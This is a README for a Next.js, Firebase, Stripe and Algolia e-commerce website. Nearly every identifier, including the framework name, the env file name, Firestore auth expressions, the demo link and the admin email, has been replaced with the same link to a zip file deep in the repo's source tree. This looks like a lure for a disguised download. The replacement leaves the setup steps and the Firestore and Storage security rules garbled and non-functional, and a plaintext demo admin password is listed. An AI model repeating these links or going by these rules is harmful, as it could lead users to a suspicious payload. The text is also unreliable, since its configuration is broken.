# Full Stack E-Commerce Website

This is a Full Stack E-Commerce Website built with **https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip 14**, **Tailwind CSS**, **Firebase**, **Stripe**, and **Algolia**.

## Features

- User authentication with Firebase
- Product browsing and searching with Algolia
- Shopping cart functionality
- Secure payment processing with Stripe
- Admin panel for managing products, orders, and users

## Technologies Used

- **Frontend**: https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip 14, Tailwind CSS
- **Backend**: Firebase (Firestore, Authentication)
- **Payment**: Stripe
- **Search**: Algolia

## Installation

1. Clone the repository:
   ```bash
   git clone <repository-url>
   ```

2. Navigate to the project directory:
   ```bash
   cd <project-directory>
   ```

3. Install the dependencies:
   ```bash
   npm install
   ```

4. Create a `https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip` file in the root directory and add the following:

   ```plaintext
   NEXT_PUBLIC_FIREBASE_API_KEY=""
   NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN=""
   NEXT_PUBLIC_FIREBASE_PROJECT_ID=""
   NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET=""
   NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID=""
   NEXT_PUBLIC_FIREBASE_APP_ID=""
   NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID=""
   
   NEXT_PUBLIC_DOMAIN=""
   
   NEXT_PUBLIC_ALGOLIA_APP_ID=""
   NEXT_PUBLIC_ALGOLIA_APP_KEY=""
   
   NEXT_PUBLIC_FIREBASE_SERVICE_ACCOUNT_KEYS='{}'
   ```

5. Start the development server:
   ```bash
   npm run dev
   ```

## Firestore Security Rules

```plaintext
service https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip {
  match /databases/{database}/documents {
    
    function isAdmin() {
      return exists(/databases/$(database)/documents/admins/$(https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip));
    }

    match /admins/{id} {
      allow read: if true;
      allow write: if isAdmin();
    }

    match /brands/{id} {
      allow read: if true;
      allow write: if isAdmin();
    }

    match /categories/{id} {
      allow read: if true;
      allow write: if isAdmin();
    }

    match /collections/{id} {
      allow read: if true;
      allow write: if isAdmin();
    }

    match /orders/{id} {
      allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip;
      allow write: if isAdmin();
    }

    match /products/{id} {
      allow read: if true;
      allow write: if isAdmin();

      match /reviews/{uid} {
        allow read: if true;
        allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
      }
    }

    match /users/{uid} {
      allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
      allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;

      match /checkout_sessions/{id} {
        allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
        allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
      }

      match /checkout_sessions_cod/{id} {
        allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
        allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
      }

      match /payments/{id} {
        allow read, write: if false;
      }
    }
  }
}
```

## Firestore Storage Security Rules

```plaintext
rules_version = '2';
service https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read: if true;
      allow write: if https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip != null && https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip(/databases/(default)/documents/admins/$(https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip));
    }
  }
}
```

## Demo

You can explore the demo of the e-commerce website at [this link](https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip). 

To access the Admin Panel, use the following credentials:

- **Email**: https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip
- **Password**: iloveyou

(Note: This demo admin account has read and write permissions disabled for security purposes.)

## Conclusion

This project provides a robust e-commerce solution leveraging modern technologies. Feel free to customize and extend its functionality as needed.
